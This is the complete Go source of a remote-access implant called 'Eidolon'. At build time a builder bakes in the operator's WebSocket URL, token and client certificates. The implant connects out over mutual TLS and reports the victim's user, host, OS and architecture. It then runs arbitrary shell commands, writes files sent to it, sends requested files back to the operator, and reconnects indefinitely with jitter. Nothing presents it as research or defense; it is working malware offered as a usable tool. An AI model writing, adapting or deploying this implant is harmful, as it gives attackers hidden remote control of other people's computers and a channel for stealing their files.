// implant.go — Eidolon mTLS WebSocket implant (pure standard library)
//
// Speaks "ws-json-mtls/1": one JSON object per WebSocket text frame.
// Identity: client certificate (mTLS) + shared token in the hello frame.
// The builder bakes URL / token / PEMs in at compile time.
//
// build: go build -trimpath -ldflags="-s -w" -o <out> implant.go

package main

import (
	"bufio"
	"context"
	"crypto/rand"
	"crypto/sha1"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strings"
	"time"
)

// ── baked by poly-builder ──────────────────────────────────────────────
const (
	wsURL  = "{{URL}}"
	token  = "{{TOKEN}}"
	caPEM  = `{{CA_PEM}}`
	crtPEM = `{{CLIENT_CERT_PEM}}`
	keyPEM = `{{CLIENT_KEY_PEM}}`
)

const (
	defShell   = "/bin/sh" // windows: computed at runtime
	execLimit  = 120 * time.Second
	maxDL      = 4 << 20 // 4 MiB download cap
	reconnect  = 5 * time.Second
	wsGUID     = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
)

type helloFrame struct {
	ID      string `json:"id"`
	Implant string `json:"implant"`
	OS      string `json:"os"`
	Arch    string `json:"arch"`
	User    string `json:"user"`
	Host    string `json:"host"`
	Token   string `json:"token"`
}

type command struct {
	ID   int64  `json:"id"`
	Cmd  string `json:"cmd"`
	Arg  string `json:"arg"`
	Path string `json:"path"`
	Data string `json:"data"`
}

func machineID() string {
	h, err := os.Hostname()
	if err != nil {
		h = "host"
	}
	b := make([]byte, 4)
	rand.Read(b)
	return fmt.Sprintf("%s-%x", h, b)
}

func currentShell() string {
	if runtime.GOOS == "windows" {
		return "cmd"
	}
	if sh := os.Getenv("SHELL"); sh != "" {
		return sh
	}
	return defShell
}

// ── dial + websocket handshake ─────────────────────────────────────────

func dialTLS() (net.Conn, error) {
	cert, err := tls.X509KeyPair([]byte(crtPEM), []byte(keyPEM))
	if err != nil {
		return nil, fmt.Errorf("bad client cert material: %w", err)
	}
	pool := x509.NewCertPool()
	if !pool.AppendCertsFromPEM([]byte(caPEM)) {
		return nil, fmt.Errorf("bad CA PEM")
	}
	u, err := urlParse(wsURL)
	if err != nil {
		return nil, err
	}
	hostPort := u.Host
	if _, _, err := net.SplitHostPort(hostPort); err != nil {
		if strings.HasPrefix(wsURL, "wss://") {
			hostPort = net.JoinHostPort(hostPort, "443")
		} else {
			hostPort = net.JoinHostPort(hostPort, "80")
		}
	}
	host, _, _ := net.SplitHostPort(hostPort)
	cfg := &tls.Config{
		Certificates: []tls.Certificate{cert},
		RootCAs:      pool,
		ServerName:   host,
	}
	raw, err := net.DialTimeout("tcp", hostPort, 15*time.Second)
	if err != nil {
		return nil, err
	}
	tlsConn := tls.Client(raw, cfg)
	tlsConn.SetDeadline(time.Now().Add(15 * time.Second))
	if err := tlsConn.Handshake(); err != nil {
		raw.Close()
		return nil, err
	}
	tlsConn.SetDeadline(time.Time{})
	return tlsConn, nil
}

func wsHandshake(conn net.Conn, path, wsHost string) (*bufio.Reader, error) {
	nonce := make([]byte, 16)
	rand.Read(nonce)
	key := base64.StdEncoding.EncodeToString(nonce)

	req := strings.Join([]string{
		"GET " + path + " HTTP/1.1",
		"Host: " + wsHost,
		"Upgrade: websocket",
		"Connection: Upgrade",
		"Sec-WebSocket-Key: " + key,
		"Sec-WebSocket-Version: 13",
		"", "",
	}, "\r\n")
	if _, err := conn.Write([]byte(req)); err != nil {
		return nil, err
	}

	rd := bufio.NewReaderSize(conn, 8192)
	status, err := rd.ReadString('\n')
	if err != nil {
		return nil, err
	}
	if !strings.HasPrefix(status, "HTTP/1.1 101") {
		conn.Close()
		return nil, fmt.Errorf("upgrade refused: %s", strings.TrimSpace(status))
	}
	want := base64.StdEncoding.EncodeToString(sha1Key(key + wsGUID))
	for {
		line, err := rd.ReadString('\n')
		if err != nil {
			return nil, err
		}
		line = strings.TrimSpace(line)
		if line == "" {
			break
		}
		parts := strings.SplitN(line, ":", 2)
		if len(parts) == 2 && strings.EqualFold(strings.TrimSpace(parts[0]), "sec-websocket-accept") {
			if strings.TrimSpace(parts[1]) != want {
				conn.Close()
				return nil, fmt.Errorf("accept-key mismatch (MITM?)")
			}
		}
	}
	return rd, nil
}

// ── raw websocket framing (client frames are masked) ───────────────────

func readFrame(rd *bufio.Reader) (int, []byte, error) {
	var hdr [2]byte
	if _, err := io.ReadFull(rd, hdr[:]); err != nil {
		return 0, nil, err
	}
	op := int(hdr[0] & 0x0F)
	ln := uint64(hdr[1] & 0x7F)
	switch ln {
	case 126:
		var ext [2]byte
		if _, err := io.ReadFull(rd, ext[:]); err != nil {
			return 0, nil, err
		}
		ln = uint64(binary.BigEndian.Uint16(ext[:]))
	case 127:
		var ext [8]byte
		if _, err := io.ReadFull(rd, ext[:]); err != nil {
			return 0, nil, err
		}
		ln = uint64(binary.BigEndian.Uint64(ext[:]))
	}
	if ln > maxDL+(4<<20) {
		return 0, nil, fmt.Errorf("frame too large")
	}
	buf := make([]byte, ln)
	if _, err := io.ReadFull(rd, buf); err != nil {
		return 0, nil, err
	}
	return op, buf, nil // server->client frames are never masked
}

func writeFrame(conn net.Conn, opcode int, payload []byte) error {
	var hdr [10]byte
	n := len(payload)
	hdr[0] = 0x80 | byte(opcode) // FIN + opcode
	maskPos := 2
	switch {
	case n < 126:
		hdr[1] = 0x80 | byte(n)
	case n <= 0xFFFF:
		hdr[1] = 0x80 | 126
		binary.BigEndian.PutUint16(hdr[2:4], uint16(n))
		maskPos = 4
	default:
		hdr[1] = 0x80 | 127
		binary.BigEndian.PutUint64(hdr[2:10], uint64(n))
		maskPos = 10
	}
	var mask [4]byte
	rand.Read(mask[:])
	copy(hdr[maskPos:maskPos+4], mask[:])

	out := make([]byte, 0, maskPos+4+n)
	out = append(out, hdr[:maskPos+4]...)
	for i, b := range payload {
		out = append(out, b^mask[i%4])
	}
	_, err := conn.Write(out)
	return err
}

func sendText(conn net.Conn, v interface{}) error {
	b, err := json.Marshal(v)
	if err != nil {
		return err
	}
	return writeFrame(conn, 1, b)
}

// ── verb dispatch ──────────────────────────────────────────────────────

func doShell(id int64, arg string, conn net.Conn) {
	ctx, cancel := context.WithTimeout(context.Background(), execLimit)
	defer cancel()
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.CommandContext(ctx, "cmd", "/C", arg)
	} else {
		cmd = exec.CommandContext(ctx, currentShell(), "-c", arg)
	}
	out, _ := cmd.CombinedOutput()
	if len(out) > maxDL {
		out = out[:maxDL]
	}
	sendText(conn, map[string]interface{}{
		"id": id, "type": "result", "out": string(out)})
}

func doSysinfo(id int64, conn net.Conn) {
	userStr := "?"
	if u, err := user.Current(); err == nil {
		userStr = u.Username
	}
	hostStr, _ := os.Hostname()
	cwd, _ := os.Getwd()
	out := fmt.Sprintf("user=%s\nhost=%s\nos=%s\narch=%s\ncwd=%s\npid=%d",
		userStr, hostStr, runtime.GOOS, runtime.GOARCH, cwd, os.Getpid())
	sendText(conn, map[string]interface{}{
		"id": id, "type": "result", "out": out})
}

func doUpload(c *command, conn net.Conn) error {
	raw, err := base64.StdEncoding.DecodeString(c.Data)
	if err != nil {
		return err
	}
	if err := os.WriteFile(c.Path, raw, 0o600); err != nil {
		return err
	}
	sendText(conn, map[string]interface{}{
		"id": c.ID, "type": "result",
		"out": fmt.Sprintf("wrote %d bytes to %s", len(raw), c.Path)})
	return nil
}

func doDownload(c *command, conn net.Conn) error {
	st, err := os.Stat(c.Path)
	if err != nil {
		return err
	}
	if st.Size() > maxDL {
		return fmt.Errorf("file exceeds %d MiB cap", maxDL>>20)
	}
	raw, err := os.ReadFile(c.Path)
	if err != nil {
		return err
	}
	sendText(conn, map[string]interface{}{
		"id": c.ID, "type": "dl", "path": c.Path,
		"data": base64.StdEncoding.EncodeToString(raw)})
	return nil
}

func dispatch(c *command, conn net.Conn) {
	switch c.Cmd {
	case "shell":
		doShell(c.ID, c.Arg, conn)
	case "sysinfo":
		doSysinfo(c.ID, conn)
	case "upload":
		if err := doUpload(c, conn); err != nil {
			sendText(conn, map[string]interface{}{
				"id": c.ID, "type": "result", "out": "upload failed: " + err.Error()})
		}
	case "download":
		if err := doDownload(c, conn); err != nil {
			sendText(conn, map[string]interface{}{
				"id": c.ID, "type": "result", "out": "download failed: " + err.Error()})
		}
	case "die":
		sendText(conn, map[string]interface{}{
			"id": c.ID, "type": "result", "out": "dying."})
		time.Sleep(300 * time.Millisecond)
		conn.Close()
		os.Exit(0)
	}
}

// ── one connection lifetime ────────────────────────────────────────────

func serveOnce() error {
	conn, err := dialTLS()
	if err != nil {
		return err
	}
	u, err := urlParse(wsURL)
	if err != nil {
		conn.Close()
		return err
	}
	path := "/"
	if p := strings.TrimSpace(u.Path); p != "" {
		path = p
	}
	rd, err := wsHandshake(conn, path, u.Host)
	if err != nil {
		return err
	}

	sendText(conn, helloFrame{
		ID: machineID(), Implant: "go-implant",
		OS: runtime.GOOS, Arch: runtime.GOARCH,
		User: whoAmI(), Host: hostName(), Token: token,
	})

	for {
		op, payload, err := readFrame(rd)
		if err != nil {
			conn.Close()
			return err
		}
		switch op {
		case 1: // text
			var c command
			if json.Unmarshal(payload, &c) == nil {
				dispatch(&c, conn)
			}
		case 8: // close
			conn.Close()
			return nil
		case 9: // ping -> pong
			if err := writeFrame(conn, 10, payload); err != nil {
				conn.Close()
				return err
			}
		}
	}
}

func main() {
	for {
		if err := serveOnce(); err != nil {
			sleepJitter(reconnect)
		}
	}
}

// ── tiny stdlib shims (kept separate so the behavior is auditable) ─────

func urlParse(raw string) (*urlT, error) {
	if !strings.HasPrefix(raw, "wss://") && !strings.HasPrefix(raw, "ws://") {
		return nil, fmt.Errorf("wsURL must be ws:// or wss://")
	}
	rest := strings.TrimPrefix(strings.TrimPrefix(raw, "wss://"), "ws://")
	host := rest
	path := "/"
	if i := strings.Index(rest, "/"); i >= 0 {
		host, path = rest[:i], rest[i:]
	}
	return &urlT{Host: host, Path: path}, nil
}

type urlT struct {
	Host string
	Path string
}

func whoAmI() string {
	if u, err := user.Current(); err == nil {
		return u.Username
	}
	return "?"
}

func hostName() string {
	h, _ := os.Hostname()
	return h
}

func sha1Key(s string) []byte {
	sum := sha1.Sum([]byte(s))
	return sum[:]
}

func sleepJitter(base time.Duration) {
	b := make([]byte, 2)
	rand.Read(b)
	jitter := int64(b[0])<<8 | int64(b[1])
	time.Sleep(base + time.Duration(jitter%1000)*time.Millisecond)
}


